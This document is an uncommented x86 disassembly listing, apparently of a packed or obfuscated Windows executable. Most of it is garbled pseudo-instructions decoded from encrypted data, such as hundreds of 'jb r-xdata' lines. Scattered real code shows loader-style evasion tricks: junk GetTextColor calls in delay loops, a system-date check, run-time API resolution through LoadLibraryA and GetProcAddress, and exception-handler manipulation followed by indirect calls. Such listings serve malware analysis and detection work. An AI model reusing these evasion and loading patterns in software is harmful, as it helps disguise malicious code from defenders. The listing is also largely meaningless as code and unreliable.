or bl [ esi ]
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
fisubr [ ecx + 0x1c ]
or eax [ edi + 0x721d1d0c ]
jb r-xdata
and bh [ ecx + edi * 4 + 0x7272212b ]
jb r-xdata
sbb eax 0x6372721d
fidiv [ edx - 0x121d1d59 ]
push cs
mov bl 0xb
sbb eax 0x619aa269
jb r-xdata
imul ebx [ edx - 0x39459602 ] 0x1d27f30b
jb r-xdata
jb r-xdata
0xc6ba69fe 0xf30b
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
cmp cl [ ebx ]
cmp al 0x4f
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x741da5b1
sbb eax 0x7272721d
xor al 0x9
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ecx
jb r-xdata
push edx
jne r-xdata
and ch ch
popad
and esp eax
test [ ecx - 0x25 ] ah
retn 0xa50b
sbb eax 0xbc72721d
daa
jb r-xdata
sbb eax 0xf6971d1d
mov dl 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
xor dh [ edx + 0xb3e971d ]
mov [ esi ] ebp
sbb eax 0xb572721d
sahf
salc
daa
jb r-xdata
loop r-xdata
mov [ 0x1e87619a ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or ebx [ ebp + 0xe ]
in eax dx
jb r-xdata
pop es
sbb al 0x1d
sbb eax 0x72727272
and cl [ bp + di ]
jb r-xdata
jb r-xdata
in al 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
mov bh 0x9
or eax eax
sbb [ 0x7272721d ] bl
jb r-xdata
sbb eax 0x72727272
jb r-xdata
bound ebx [ bx ]
sbb eax 0xb590a1d
sbb eax 0x6a76f1d
loopne r-xdata
in eax dx
and al 0xa
inc esi
adc [ 0xffffffffe31a611d ] bl
jb r-xdata
sbb eax 0xe5d0b1d
sbb eax 0xe31a611d
jb r-xdata
sbb eax 0x1db2f697
imul esp [ edi - 0x51f44eea ] 0x24
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
xchg edi eax
push es
sbb eax 0xa76bc2b5
push ds
or eax [ esi ]
xor bl [ 0x7272721d ]
jb r-xdata
dec edx
or edx [ ebx ]
mov ah 0xb5
mov al 0x5c
jb r-xdata
sbb eax 0x6d008a1d
jb r-xdata
popad
jb r-xdata
mov edx 0x27f30bc6
jb r-xdata
mov bh 0x16
push ss
jb r-xdata
add edx [ ebx + 0x1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
mov [ edx + 0x699088bd ] dl
and eax 0xf6a76b84
or esi [ edi ]
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
outsd
or ecx [ edi + 0x17 ]
or ebx [ 0x6a76f1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop ds
push cs
popad
fcmovnb st2
or esp [ ebp + 0x721d1d51 ]
sbb eax 0x1d53d70b
sbb eax 0x72727272
mov cl 0x1d
xchg edi eax
sbb eax 0xe2e24675
loop r-xdata
in eax dx
fst [ bp + di + 0x1d ]
jb r-xdata
jb r-xdata
push eax
jb r-xdata
push ss
mov cl 0xb
scasb [ edi ]
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop edi
sbb eax 0x1e9f611d
out 0xb al
and edx [ ebx + 0x1d ]
sbb eax 0x72727272
scasd [ edi ]
mov ebx 0x130bb5ba
mov al [ eax ]
jb r-xdata
push ds
daa
or esi ebx
jb r-xdata
sbb eax 0xea971d1d
and al 0x2e
jb r-xdata
sbb eax 0x9aa2691d
jb r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out dx al
and eax 0x69bb1d1d
lodsd [ esi ]
jb r-xdata
loop r-xdata
jb r-xdata
or esi [ ecx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x6f72721d
sbb eax 0xb06a76f
dec edi
pop ss
test [ ebx - 0x61 ] ch
push cs
mov eax 0xdab76b84
imul ebx [ ebx + ecx ] 0x1d1d0c87
jb r-xdata
sub [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
loop r-xdata
mov esp 0x7272212b
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or [ 0x7272721d ] ebx
jb r-xdata
or ebp [ esi + 0x721d1d24 ]
jb r-xdata
0xaf6b84 0x890a
jb r-xdata
popad
in al 0xed
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
xor [ eax ] ebp
jb r-xdata
jb r-xdata
insd
sbb eax 0xe2e22e55
jb r-xdata
jb r-xdata
imul esp [ edx + 0x1e87619a ] 0x6923e1e2
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edi [ edi + ecx * 2 ]
jb r-xdata
loop r-xdata
sub ebp ebp
sbb eax 0xeead69bb
rcr [ 0xffffffffe188b5b5 ] 0x1
or eax [ eax + 0x721d1d39 ]
jb r-xdata
sbb eax 0xbb5fab5
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ecx [ ecx + 0x721d1d2e ]
jb r-xdata
imul ebx [ esi - 0x6124313a ] 0xffffffc6
aas
sbb eax 0xed727272
jb r-xdata
jb r-xdata
mov ch 0xb
mov [ 0x611d1d57 ] eax
jb r-xdata
push cs
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
and al 0x1d
jb r-xdata
imul ebp [ edi + 0x24890a00 ] 0x1d
sbb eax 0xed2267bb
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
add bh [ ebx - 0x4df55891 ]
imul esp [ edi - 0x50947b16 ] 0x24890a00
sbb eax 0x2267bb1d
sbb eax 0xee0bceb5
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb eax 0x2bbc7272
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0x676fea97
jb r-xdata
0xe21e8761 0x23e1
jb r-xdata
jb r-xdata
dec edi
jb r-xdata
mov cl 0xa5
jb r-xdata
loop r-xdata
cmp [ 0x55ed721d ] ebx
jb r-xdata
sbb eax 0xf150b1d
dec ebp
jb r-xdata
jb r-xdata
cli
imul esp [ edx + edi * 4 + 0x1d27b10a ] 0x1d
mov ch [ 0xffffffffb50cda09 ]
imul esp [ esi + edi * 4 + 0x1d27a70a ] 0x1d
mov ch [ edi ]
xchg esi eax
and al 0xb5
imul esp [ esi + ebp * 2 - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
mov dh 0x52
popad
sbb ah bl
sub esp [ ecx ]
sbb ah bl
jb r-xdata
sbb eax 0xe31a611d
in al 0xe3
loop r-xdata
mov edi 0xea60a0e
sbb eax 0xee26611d
and ch ch
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
in eax dx
add [ edx ] cl
mov [ ebx + 0x2267bb1d ] esp
jb r-xdata
pop ss
jb r-xdata
adc bl [ 0x7272721d ]
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x1e0a676f 0x1d1d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
xor [ ecx ] ebx
popad
and al 0xea
mov al [ 0x41f7be6a ]
or edx [ esp + ebx * 2 ]
sbb eax 0x7272721d
jb r-xdata
mov ah 0xda
imul edi [ edx ] 0x1d285f0b
sbb eax 0x72727272
jb r-xdata
imul esp [ 0xfffffffff6a76b84 ] 0x1d1b370b
sbb eax 0x72727272
jb r-xdata
loop r-xdata
sbb eax 0xd055ed72
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ ebx - 0x1ee2e2c9 ]
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov edi 0x16bf6b02
test cl bl
movsb [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
0x7272212b 0x7272
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ 0x13c20bee ] al
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbc0bea97
pop ss
sbb eax 0x7272721d
in eax dx
jb r-xdata
sbb eax 0x69caac69
mov edi 0x6930bee
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
sbb eax 0x74d0b1d
aas
jb r-xdata
jb r-xdata
popad
jb r-xdata
imul ebp [ edi - 0x589044fe ] 0xa
mov dl 0x69
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbf6b0697
jb r-xdata
sbb eax 0x72727272
and [ 0x7272721d ] ebx
xor [ edi ] 0x1d
push ds
jb r-xdata
in eax dx
call sub_45bcd8
loop r-xdata
or dh bl
sub bl [ 0x2267bb1d ]
and ch ch
loop r-xdata
jb r-xdata
jb r-xdata
adc bl [ ebx + 0x1d ]
sbb eax 0x72727272
jb r-xdata
mov ch 0x88
jecxz r-xdata
sbb eax 0xe188b5b5
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov dl 0x6b
push 0x52
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
or edx [ ebx + 0x721d1d06 ]
jb r-xdata
push ss
aaa
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xed22671d
loop r-xdata
or cl [ ebp + 0x52 ]
jb r-xdata
sbb eax 0xb22e11d
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
les ecx [ ebp + 0x1d ]
lea bx [ edi ]
aas
jb r-xdata
sbb eax 0x89f0bcf
sbb eax 0xd2a66f1d
sbb eax 0xb2f6971d
sbb eax 0xe2e20e75
jb r-xdata
je r-xdata
jb r-xdata
jb r-xdata
stc
loope r-xdata
imul edi [ edi + 0x69818818 ] 0x38
or ebp [ ebx ]
push ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x22d1721d
push es
jb r-xdata
sbb eax 0x160b22e1
jb r-xdata
jb r-xdata
xchg esp eax
jb r-xdata
jb r-xdata
or edi edi
jb r-xdata
xchg edi eax
add bl [ 0xffffffffe2e26675 ]
loop r-xdata
sbb eax 0xed22671d
or ecx [ ebp + 0x7 ]
jb r-xdata
push edx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg cx ax
adc ebx [ 0xa7e0b1d ]
sbb eax 0x7272721d
jb r-xdata
sbb [ 0xffffffffa76f721d ] bl
sbb eax 0x900bb294
jb r-xdata
jb r-xdata
sbb eax 0x72727272
loop r-xdata
sbb eax 0x1d074d0b
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
loop r-xdata
jb r-xdata
imul ebp [ ebx + 0x16afe11a ] 0x1d244b0b
sbb eax 0xb727272
xchg ebx eax
out 0xe2 al
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
imul edi [ esi - 0x267b162e ] 0x33
or ebx [ ebx + 0x58 ]
sbb eax 0xcaac691d
and ch [ ebx ]
jb r-xdata
test [ ebx - 0x49 ] ch
cmp cl [ ebx ]
dec esi
sbb eax 0x7272721d
or ebx [ ebx ]
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
sbb eax 0x2b22d172
jb r-xdata
and cl [ ebx ]
jb r-xdata
loope r-xdata
jb r-xdata
sbb eax 0x72727272
test [ ebx - 0x49 ] ch
cmp [ eax + 0x6b849288 ] bh
push esp
loop r-xdata
push ss
mov dl 0xb
imul ebp [ edx ] 0x1d
sbb eax 0x72727272
or edx [ eax + 0x721d1d18 ]
outsd
jb r-xdata
jb r-xdata
pop ss
jb r-xdata
jb r-xdata
sbb eax 0x751d0297
pop es
jb r-xdata
jb r-xdata
imul esp [ 0x7221bfbd ] 0x72727272
jb r-xdata
jb r-xdata
imul ebp [ edx ] 0x1d1cbf0b
sbb eax 0x72727272
jb r-xdata
mov [ esp + eax * 4 - 0x47434895 ] cl
mov [ esi + 0x1d0a380b ] al
sbb eax 0x72727272
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
jb r-xdata
mov dl 0xb
jb r-xdata
jb r-xdata
dec ebp
jb r-xdata
push edi
or [ 0x7272721d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
sbb ah cl
jb r-xdata
add [ 0xffffffff8c66ed1d ] ebx
imul ebp [ edi + 0x364d0b2e ] 0x1d
sbb eax 0x72727272
mov [ 0x1d2f690b ] al
sbb eax 0x72727272
sbb eax 0x1d0a7272
daa
sbb eax 0x22d1bb1d
imul esi [ edi - 0x6d7747c8 ] 0xffffff84
imul esi [ edi + 0x510bb83e ] 0x4e
sbb eax 0x7272721d
jb r-xdata
dec esi
jb r-xdata
push esi
sbb eax 0xa72721d
jb r-xdata
out dx al
xor al 0x3b
sbb eax 0xe024611d
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
sbb eax 0x1d0bb11d
or edx [ esi ]
jb r-xdata
mov bh 0x3e
mov eax 0x1d4e510b
mov eax 0x6b849288
scasb [ di ]
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
loopne r-xdata
jb r-xdata
imul esp [ edi + 0x2eafe136 ] 0x526a6bb2
loop r-xdata
sbb eax 0x67ed2267
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edx [ 0x721d1d0f ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ch [ edi + edx * 2 ]
jb r-xdata
scasd [ edi ]
jb r-xdata
jb r-xdata
nop
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx esp
popad
mov ebx 0xb2267bb
in eax dx
jb r-xdata
popad
xor bl [ 0x7272721d ]
jb r-xdata
inc edx
stosb [ edi ]
0xa20b2569 0x1d50
test [ ebx - 0x51 ] ch
or ecx [ cs : ebp + 0x36 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
mov eax 0x1d4e510b
loop r-xdata
out dx al
sbb al 0xb
dec edi
add [ 0x7272721d ] bl
jb r-xdata
or edx [ eax ]
push es
and [ bp + 0x1d ] eax
sbb eax 0x1d23fa0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
cmp [ edi - 0x59 ] ebp
imul esp [ 0x1d50a20b ] 0x7272721d
jb r-xdata
jb r-xdata
aam 0x3e
jb r-xdata
loope r-xdata
fstp [ edi + 0x6930bee ]
out dx eax
and ch ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
loop r-xdata
jb r-xdata
nop [ 0x72727272 ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
mov bl 0xb
xlat
call 0xffffffffdc5199cd
xor al 0x1d
jb r-xdata
or ebp esi
mov ch 0xce
or cl [ ecx - 0x44e2e2dc ]
and ch ch
imul edi [ edi + 0x16bf6b02 ] 0xffffff84
fldenv [ esp + 0x17fa61ed ]
jb r-xdata
sbb eax 0xa76f721d
in eax dx
bound esi [ ecx + 0x1d25cb0b ]
sbb eax 0x4acb66ed
sbb eax 0x5aaf6f1d
outsd
cmpsd [ esi ] [ edi ]
dec edx
or dh ah
cmp [ 0xffffffffed22671d ] bl
hlt
sar [ ecx ] 0x1
outsd
cmpsd [ esi ] [ edi ]
and ch ch
jb r-xdata
or esi [ ecx + ecx ]
jb r-xdata
or ecx [ ebx + 0x24 ]
sbb eax 0x7272721d
or edx [ ebx + 0x72e2e2e6 ]
imul edi [ 0x24611931 ] 0xbe6aa0ea
test [ ecx + 0xb ] 0x1d1d5c14
jb r-xdata
cmp ebx [ 0xffffffffe024611d ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jno r-xdata
jb r-xdata
pop edx
sbb eax 0x4c710a1d
jb r-xdata
jb r-xdata
mov [ ecx + 0x6b843b69 ] dl
imul edi [ eax ] 0x42bf6b84
jb r-xdata
sbb eax 0xbe02461
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sub ebx [ eax + 0x1d ]
sbb eax 0x66ed2267
cli
loop r-xdata
jb r-xdata
in eax dx
jb r-xdata
or ecx [ edx + 0x33 ]
sbb eax 0x7272721d
jb r-xdata
fcmovnbe st6
jb r-xdata
inc eax
imul edi [ eax ] 0x46bf6b84
mov ecx 0x6b849688
imul ebp [ edx + 0xb2569ea ] 0x1d1d50a2
jb r-xdata
sbb eax 0x7272721d
pop ds
sbb eax 0x17ff0b1d
cli
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x2bbbbb1d
and [ edx + 0x72 ] esi
sub al 0x57
jpe r-xdata
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x54ae2c2 ] 0xffffffb5
xchg edi eax
sbb eax 0x6971d72
mov edx 0x1d34dc0b
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
mov ah dl
0x4a0be2e2 0x1d3b
or [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
mov eax eax
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xed1aa7db
outsb
jo r-xdata
sbb eax 0xed22671d
jb r-xdata
cmp ebx [ bx + si + 0x1d ]
sbb eax 0x722122d1
jb r-xdata
loop r-xdata
sbb eax 0x1d4c710a
sbb eax 0x67ed2267
out dx eax
das
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbb1d1d27
shl [ edx ] 0x1
loop r-xdata
sbb eax 0xed22671d
and al 0xe0
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
scasb [ edi ]
mov dl ah
sbb eax 0xe2e24e74
loop r-xdata
sbb eax 0x7272721d
cmpsd [ esi ] [ edi ]
sbb dh [ edx + 0xc0a2469 ]
pop ebp
sbb eax 0x2267bb1d
jb r-xdata
loopne r-xdata
xchg edx eax
sbb eax 0x8590b1d
sbb eax 0x2267721d
or esp edx
add [ 0xffffffffee0ab51d ] ebx
and ebx [ 0x67bbbb1d ]
and cl [ ebx ]
sbb eax 0x1d35170b
sbb [ ecx + 0x1d ] ecx
mov dl al
in eax dx
mov edi 0x9188b944
test [ ebx - 0x41 ] ch
dec edx
mov ecx 0x48bf6b84
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub al 0x1d
sbb eax 0x8a727272
fsubp st0
sar [ edx + 0x1d34dc0b ] 0x1d
or edx edi
jb r-xdata
sub cl [ ebx ]
sub eax 0x2a691d1d
or edi [ edi + 0x721d1d1c ]
adc [ ecx ] eax
sbb eax 0x8c66ed1d
jb r-xdata
out dx al
loopne r-xdata
mov edi 0x84386940
imul edi [ edi - 0x697746ba ] 0xffffff84
imul edi [ edi - 0x6e7746bc ] 0xffffff84
imul edi [ edi + 0x6b84b94a ] 0xffffffbf
dec eax
jb r-xdata
push es
fdiv [ ebx - 0x68e28de3 ]
jb r-xdata
jb r-xdata
out dx eax
jb r-xdata
sbb eax 0x8a727272
jb r-xdata
jb r-xdata
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e579
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push rw-data
push ebp
jb r-xdata
clc
jb r-xdata
jb r-xdata
push ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
loop r-xdata
loop r-xdata
add [ eax ] al
jb r-xdata
jb r-xdata
sbb eax 0xb11dd11d
or esp [ eax + 0x28 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or ch [ eax + 0xb1d1d13 ]
or [ esi ] eax
sbb [ bx + di + 0x1d ] ecx
cli
in eax dx
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ecx 0x6b849188
mov edi 0x6b84b94a
mov edi 0x6100b48
add eax 0xaf691d1d
0x1f1a676f 0x1d1d
or bh dl
imul edi [ edi - 0x7bc796c0 ] 0x6b
mov edi 0x9688b946
test [ ebx - 0x41 ] ch
inc esp
jb r-xdata
jb r-xdata
xchg ebx eax
jb r-xdata
sbb eax 0x1d3f7a0b
sbb eax 0x72727272
mov dl 0x6f
sbb eax 0x971d721d
jb r-xdata
jb r-xdata
loop r-xdata
and eax 0xb48c3ea7
scasd [ edi ]
scasd [ edi ]
or dh ch
add ebx [ 0xffffffffb9bcbd1d ]
and ch ch
in al 0x26
sbb eax 0x36af6f1d
outsd
cmpsd [ esi ] [ edi ]
or ecx [ es : esi + 0x27 ]
sbb eax 0xb41d721d
fisubr [ ecx + 0x3a ]
or ebx [ edi + 0x28 ]
sbb ebx [ 0x7272721d ]
jb r-xdata
xchg edx eax
mov ebp 0x25699088
test [ ebx - 0x59 ] ch
test [ ebx ] 0x37
jb r-xdata
jb r-xdata
nop
nop
push 0x0
in al dx
jb r-xdata
retn
jb r-xdata
popad
and al ah
test [ edi + 0x22 ] ah
in eax dx
xor ax 0x1d06
sbb eax 0x84e055ed
jb r-xdata
or esp [ ecx + 0x32 ]
sbb eax 0x7272721d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
cli
and ebx [ 0x7272721d ]
jb r-xdata
out dx eax
loop r-xdata
push es
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
jmp r-xdata
jb r-xdata
pop ebp
jb r-xdata
push ebp
imul ecx [ esi ] 0x69f60e61
adc ah dl
loop r-xdata
imul edi [ edx ] 0x32a76b84
or ecx [ edx + eax + 0x72721d1d ]
jb r-xdata
add [ eax + 0x1d ] cl
sbb eax 0x84bb3c69
imul edi [ edi - 0x7bc596aa ] 0x6b
cmpsd [ esi ] [ edi ]
xor cl [ ebx ]
mov [ edx ] es
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xfa
0x1d22 0xb1d
and ch ch
mov [ fs : eax ] esp
add [ ebx ] dh
jb r-xdata
rcl [ ebp - 0x75 ] 0xec
jb r-xdata
sbb eax 0x72727272
mov ch dl
loopne r-xdata
or ebx [ edi + 0x6f1d1d08 ]
cmpsb [ esi ] [ edi ]
sar dl cl
jb r-xdata
iretd
jb r-xdata
test bl bl
jb r-xdata
jb r-xdata
loop r-xdata
and [ 0x7272721d ] ebx
jb r-xdata
mov ebx 0x920b2267
loop r-xdata
mov [ rw-data ] 0x70ec
nop
nop
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jb r-xdata
nop
push 0x0
call GetTextColor
jmp r-xdata
jae r-xdata
or cl [ ebx * 2 + 0x67bb1d1d ]
and ch ch
in eax 0x5d
retn 0x4
in eax dx
mov cl 0xb5
or esi [ esi + 0xb1d1d5b ]
adc [ eax + 0x1d ] ebx
mov ebx 0xba222d1
imul ebp [ edi ] 0x72721d1d
jb r-xdata
sbb edx [ esi + 0x1d ]
cmpsd [ esi ] [ edi ]
push ss
or edx [ ebp + 0x58 ]
sbb eax 0xdb72721d
cdq
fsubp st5
les ecx [ di + 0x1d ]
outsd
mov esp 0xbfbd2569
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0x72727272
rcl [ ebp + 0x68 ] 0x72
jb r-xdata
mov ebp esp
jb r-xdata
cli
or [ 0xffffffffd2a66f1d ] bl
mov cl 0x1d
mov ah 0xde
or esp edi
lahf
jb r-xdata
salc
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
mov ah 0xa
test al 0x13
sbb eax 0x6090b1d
or cl [ eax ]
inc esp
sbb eax 0xee26611d
loop r-xdata
mov [ rw-data ] 0x5b8b
nop
mov [ rw-data ] 0x1
or edx [ ecx + 0x4e ]
jb r-xdata
push r-xdata
jb r-xdata
jb r-xdata
xor ch [ edi + 0x67 ]
bound ebx [ edi ]
jb r-xdata
sbb eax 0x6772721d
and cl [ ebx ]
sbb eax 0x721d1d4e
jb r-xdata
sbb eax 0xbb6d008a
mov edx 0x4a130bb5
adc [ 0x7272721d ] ebx
jb r-xdata
sbb eax 0xe70bdeb4
scasw [ edi ]
loop r-xdata
nop
nop
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x1a99
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
sbb eax 0xbb5fab5
jb r-xdata
in eax 0x45
jb r-xdata
xor eax eax
jb r-xdata
bound ebx [ bx ]
jb r-xdata
mov [ rw-data ] 0x3177
nop
push 0x0
call GetTextColor
mov [ rw-data ] 0x1
nop
nop
jmp r-xdata
add [ edi + edi * 8 + 0x30 ] ah
jb r-xdata
push ebp
jb r-xdata
pop ds
jb r-xdata
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x8a0c
jne r-xdata
nop
push 0x0
call GetTextColor
nop
nop
mov eax 0x1fd3a51b
call sub_4026bc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push [ eax ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
sbb eax 0x441d0bb1
jb r-xdata
mov [ rw-data ] 0x1
jb r-xdata
mov ah 0xe2
inc ebp
add bl al
jmp r-xdata
inc ebp
jb r-xdata
or ebx [ 0x721d1d44 ]
jb r-xdata
jb r-xdata
mov ecx 0x8e
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403174
jae r-xdata
and [ ebx + 0x461bd82d ] al
jb r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
push [ fs : eax ]
jb r-xdata
mov edi 0x721d1d1c
sbb eax 0xb2a691d
jb r-xdata
inc esp
jb r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_40316c
sub eax rw-data
jb r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403658
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub [ rw-data ] 0x1
xor [ ecx + ecx * 4 + 0x20 ] ah
jb r-xdata
sbb eax 0x72727272
jb r-xdata
shl [ edx ] 0x1
mov [ 0x1d08ee0b ] al
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1fd39246
jne r-xdata
call sub_403174
add [ edi ] ecx
sbb eax [ esi ]
jb r-xdata
mov [ eax ] esp
jb r-xdata
sbb eax 0x72727272
jb r-xdata
and ah [ edx + 0x1d08ee0b ]
mov [ ebx + ebp * 2 - 0x77474349 ] es
xchg [ ebx ] cl
jb r-xdata
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
mov [ rw-data ] 0x1
add [ ecx ] al
jb r-xdata
jb r-xdata
cmp [ edx ] cl
sbb eax 0x7272721d
jb r-xdata
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x89ed
jne r-xdata
xor eax eax
mov [ rw-data ] eax
nop
push rw-data
call [ rw-data ]
nop
jb r-xdata
fcomp [ ebx ]
jb r-xdata
inc ebp
and al 0x85
lodsb [ esi ]
or ah [ edi + 0x11 ]
sbb eax 0x51350b1d
sbb eax 0x7272721d
mov esp 0x1d51740b
sbb eax 0x9f6b1d88
sbb cl [ ebx ]
lea ecx [ edi ]
sbb eax 0xb0b5b41d
pop esp
nop
nop
push 0x12
call Sleep
nop
cmp [ rw-data ] 0x2
jbe r-xdata
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
test [ edx ] al
jb r-xdata
inc esi
jb r-xdata
nop
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_458470
mov [ rw-data ] eax
cmp [ rw-data ] 0x15
jbe r-xdata
nop
push 0x0
call sub_4584f0
nop
nop
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
call sub_403174
add [ eax ] al
jb r-xdata
jb r-xdata
imul esp [ esi + edx * 4 + 0x1d22b90a ] 0x1d
mov al [ ebx ]
loopne r-xdata
add [ edx + eax - 0x1b980000 ] 0x1b
inc esi
add al ch
retn 0xfa7c
jb r-xdata
mov [ eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
push ebx
